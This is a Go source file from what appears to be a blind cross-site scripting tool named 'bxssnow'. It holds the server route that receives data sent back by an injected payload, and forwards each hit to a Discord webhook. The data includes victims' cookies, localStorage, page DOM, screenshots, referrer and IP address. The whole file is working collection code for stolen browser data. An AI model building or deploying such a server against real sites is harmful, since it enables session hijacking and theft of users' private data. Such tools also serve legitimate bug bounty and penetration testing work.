package routes

import (
	"bxssnow/core"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/fatih/structs"
	"github.com/gin-gonic/gin"
)

type Data struct {
	URL           string `json:"url"`
	Origin        string `json:"origin"`
	UserAgent     string `json:"userAgent"`
	LocalStorage  string `json:"localStorage"`
	ScreenEncoded string `json:"screenshot_encoded"`
	Cookies       string `json:"cookies"`
	Referrer      string `json:"referrer"`
	Text          string `json:"text"`
	Dom           string `json:"dom"`
	Title         string `json:"title"`
	Iframe        string `json:"iframe"`
	IP            string
	Time          string
}

func Callback(c *gin.Context) {
	var data Data
	currentTime := time.Now()

	if err := c.ShouldBindJSON(&data); err != nil {
		c.JSON(http.StatusOK, err)
	}

	c.JSON(http.StatusOK, data)

	domain := strings.SplitAfter(data.Origin, "//")

	file, err := core.Optmize(data.ScreenEncoded, domain[1])

	if err != nil {
		core.LogErrorDiscord(err.Error())
	}

	core.FileN = file

	data.IP = c.ClientIP()

	data.Time = fmt.Sprintf("%d/%d/%d %d:%d:%d", currentTime.Year(),
		currentTime.Month(),
		currentTime.Day(),
		currentTime.Hour(),
		currentTime.Minute(),
		currentTime.Second())

	core.Msg = readTpl(data)
	core.HitDiscord()
}

func readTpl(data Data) string {
	str := ""
	m := structs.Map(data)
	f := structs.Names(&Data{})

	input, err := os.ReadFile("./tpl")
	if err != nil {
		core.LogErrorDiscord(err.Error())
	}

	lines := strings.Split(string(input), "\n")

	for i, line := range lines {
		for _, name := range f {
			if strings.Contains(line, fmt.Sprintf("{{%s}}", name)) {
				lines[i] = strings.Replace(lines[i], fmt.Sprintf("{{%s}}", name), m[name].(string), -1)
			}
		}
	}
	str = strings.Join(lines, "\n")
	return str
}
